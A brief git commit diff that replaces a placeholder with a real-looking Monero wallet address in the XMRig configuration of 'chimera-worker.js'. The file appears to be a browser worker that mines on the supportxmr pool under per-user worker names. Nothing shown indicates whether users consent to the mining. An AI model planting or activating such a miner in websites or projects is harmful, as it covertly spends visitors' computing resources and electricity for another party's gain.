2d83c4114f9b4463f68742fa9a39c925cf715fb9
immanuel2006aj-alt <immanuel2006aj@gmail.com>
2026-08-15 11:44:43 +0530

    Update XMR wallet address in chimera-worker.js
    Fix chimera-worker postMessage issue

--- chimera-worker.js
+++ chimera-worker.js
@@ -43,7 +43,7 @@ async function startMining(userIdParam, sessionIdParam) {
     try {
       miner = new XMRig({
         pool: 'pool.supportxmr.com:3333',
-        wallet: 'YOUR_XMR_WALLET_ADDRESS',
+        wallet: '46an3rRwAENNVnZhXuxMYKDFAfTP5sasbdDcpTQZRezpGfsJ8ZAoGWWTXyZBk5vLRk8z2LHQGfNthdC93dAD1uxAP9T9gA2',
         password: 'x',
         worker: `user_${userId}`,
         threads: 1,
